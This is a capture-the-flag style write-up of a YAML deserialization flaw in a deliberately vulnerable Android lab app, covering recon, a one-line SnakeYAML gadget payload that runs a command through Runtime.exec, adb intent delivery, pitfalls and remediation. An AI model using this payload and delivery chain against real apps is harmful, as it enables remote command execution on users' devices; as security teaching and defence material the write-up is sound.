---
title: "MHL Config Editor Writeup"
date: 2026-10-24
categories: [Mobile Hacking, Android]
tags: [android, mobile-hacking-lab, exported-activity, snakeyaml, yaml, deserialization, rce]
---

## Summary

Config Editor is an Android app that loads, edits and saves YAML files. It exposes an exported activity that accepts `VIEW` intents with `http`, `https` or `file` data, downloads the target, and parses it with SnakeYAML using the default constructor. Because the default constructor instantiates whatever class a `!!` tag names, an attacker-controlled YAML file can instantiate `LegacyCommandUtil`, a deprecated class whose constructor passes its argument to `Runtime.exec`. The result is arbitrary command execution as the app's uid, triggered by a single intent.

## Environment

- Target: `com.mobilehackinglab.configeditor` (debuggable build, minSdk 26, targetSdk 33)
- Tooling: jadx, adb, `python3 -m http.server`, Kali
- The device reached the host-side server at `127.0.0.1:8888`

## Recon

**Manifest.** `MainActivity` is `exported="true"` and has a second intent filter for `VIEW` with `BROWSABLE` and `DEFAULT` categories, schemes `file`, `http`, `https`, and mime type `application/yaml`. There are no host or path restrictions. The app also holds `INTERNET` and storage permissions.

**`handleIntent()`.** On `ACTION_VIEW` with non-null data, the URI goes to `CopyUtil.copyFileFromUri()`. The resulting URI is observed and passed to `loadYaml()`.

**`CopyUtil.copyFileFromUri()`.** Downloads the URL (or copies it, for `file://`) into the public Downloads directory, using the last path segment as the filename. It then posts `Uri.fromFile(outFile)` to a LiveData. On any failure it posts `Uri.EMPTY` instead. The file contents are what reach the parser, not the URL.

**`loadYaml()`.** This is the sink:

```java
Yaml yaml = new Yaml(dumperOptions);
Object deserializedData = yaml.load(inputStream);
String serializedData = yaml.dump(deserializedData);
```

There is no `SafeConstructor` and no `LoaderOptions` tag allowlist. The `dump` afterwards is irrelevant to exploitation, since code execution happens during `load`.

**`LegacyCommandUtil`.** Dead code, annotated `@Deprecated(level = ERROR)`, with a constructor that does this:

```java
public LegacyCommandUtil(String command) throws IOException {
    Runtime.getRuntime().exec(command);
}
```

Nothing calls it. The deprecation level only stops Kotlin source from calling it at compile time. It does nothing against reflection.

## Vulnerability

SnakeYAML's default `Constructor` resolves `!!fully.qualified.ClassName` by loading that class and invoking a constructor that matches the supplied arguments. This is the same bug class as CVE-2022-1471. Untrusted YAML gets to pick the class, and the app happens to ship a class whose constructor is an exec primitive. Normally a gadget like this has to be found in a library or elsewhere on the classpath. Here the app supplies it.

## Exploitation

**1. Payload.** `payload.yml`, one line: tag, full class name, and a one-element argument list matching the single `String` constructor.

```yaml
!!com.mobilehackinglab.configeditor.LegacyCommandUtil ["touch /data/user/0/com.mobilehackinglab.configeditor/rce.txt"]
```

**2. Serve it.**

```bash
python3 -m http.server 8888
```

**3. Deliver it.**

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "http://127.0.0.1:8888/payload.yml" \
  -t application/yaml \
  com.mobilehackinglab.configeditor
```

The intent has to match both a scheme and the declared mime type, hence `-d` and `-t` together.

**4. Verify.**

```bash
adb shell run-as com.mobilehackinglab.configeditor ls
```

`rce.txt` appears in the app's private data directory, and the server log shows `GET /payload.yml 200`.

![rce](/assets/img/posts/mhl-config-editor/rce.png)

![server](/assets/img/posts/mhl-config-editor/server.png)

## Pitfalls hit along the way

- **Relative paths fail silently.** My first payload used `touch rce.txt`. The app process's working directory is not its data directory, so `touch` failed, and `Runtime.exec` reports nothing on failure. An absolute path fixed it.
- **`exec(String)` has no shell.** Arguments split on whitespace, so pipes, redirects and `&&` do not work. A proof of execution needs a visible side effect and a simple command.
- **Verify on the device, not the host.** `ls files` on Kali checks the wrong filesystem. Use `adb shell run-as <pkg> ls`.
- **Wrong logcat tag.** The app's `TAG` is `Companion.class.getSimpleName()`, so log lines are tagged `Companion`, not the package name. Grepping for `configeditor` hid the app's own error messages. Filter on `Companion`, `Error loading` and `Error copying` instead.

## Impact

**Demonstrated:** arbitrary command execution as the app's uid, from a single intent pointing at an attacker-controlled URL, with no further user interaction. Anything the sandbox allows that app, including reading its private data and using its `INTERNET` permission, is in reach.

**What this could lead to (not demonstrated):** with `exec` as the app uid, an attacker could attempt to stage a stronger payload, since `exec(String)` can launch a downloaded binary or script, and try to establish a remote shell. Escaping the app sandbox would need a separate privilege escalation vulnerability on the device. This bug does not provide that by itself.

Delivery is also realistic. The filter is `BROWSABLE`, so a link can trigger it, subject to how the browser maps the link to the intent's mime type.

## Remediation

1. Parse untrusted YAML with `new Yaml(new SafeConstructor(new LoaderOptions()))`, or in newer SnakeYAML use a `TagInspector` allowlist. SnakeYAML 2.0 and later restrict global tags by default, so upgrading also helps (confirm the bundled version in the APK).
2. Delete `LegacyCommandUtil`. Dead code with an exec primitive is a loaded gun on the classpath, and `@Deprecated` is not access control.
3. Restrict the exported activity. Require HTTPS only, drop `file://` and plain `http`, validate or allowlist hosts, and avoid auto-loading content from an inbound intent without user confirmation.
4. Do not download into shared public storage under an attacker-influenced filename.
5. Enforce a network security config that disallows cleartext traffic.
6. Run software composition analysis on dependencies in CI.

## Takeaways

- Deserialization bugs need two things: a loader that trusts input, and a gadget. Here the app supplied both.
- "Deprecated" and "unused" are not security controls.
- `Runtime.exec` fails quietly, so build PoCs around side effects you can verify.
